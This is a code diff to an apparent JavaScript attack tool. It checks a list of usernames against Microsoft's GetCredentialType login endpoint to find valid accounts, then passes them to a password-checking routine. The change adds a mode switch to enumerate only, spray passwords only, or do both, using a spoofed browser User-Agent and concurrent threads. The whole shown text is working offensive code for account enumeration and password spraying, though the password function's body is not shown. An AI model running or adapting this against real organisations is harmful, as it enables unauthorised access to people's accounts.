@@ -15,37 +15,47 @@ FgGreen = "\x1b[32m"
 FgBlue = "\x1b[34m"
 FgCyan = "\x1b[36m"
 
-var pass = process.argv[3]
 var user_file = process.argv[2]
+var pass = process.argv[3]
+var mode = process.argv[4]
 
 function is_email_valid(email){
-  let bodyString = `{"Username":"${email}"}`
-  
-  let headers = {
-      "Connection": "close", 
-      "Accept-Encoding": "identity", 
-      "Accept": "*/*", 
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
-      "Content-Length": bodyString.length
-  }
-  
-  let options = {
-      url: "https://login.microsoftonline.com/common/GetCredentialType",
-      headers: headers,
-      method: "post",
-      body: bodyString
-  }
-  request(options, function (error, response, body) {
-    let email_status = JSON.parse(body).IfExistsResult
-    if(email_status == 0){
-      console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
-      is_password_valid(email)
-    }else{
-      console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
-      threads -= 1
-      thread_api()
+  if(mode == 2){
+    is_password_valid(email)
+  }else{
+    let bodyString = `{"Username":"${email}"}`
+    
+    let headers = {
+        "Connection": "close", 
+        "Accept-Encoding": "identity", 
+        "Accept": "*/*", 
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
+        "Content-Length": bodyString.length
     }
-  })
+    
+    let options = {
+        url: "https://login.microsoftonline.com/common/GetCredentialType",
+        headers: headers,
+        method: "post",
+        body: bodyString
+    }
+    request(options, function (error, response, body) {
+      let email_status = JSON.parse(body).IfExistsResult
+      if(email_status == 0){
+        console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
+        if(mode == 1){
+          threads -= 1
+          thread_api()
+        }else{
+          is_password_valid(email)
+        }
+      }else{
+        console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
+        threads -= 1
+        thread_api()
+      }
+    })
+  }
 }
 
 function is_password_valid(email){
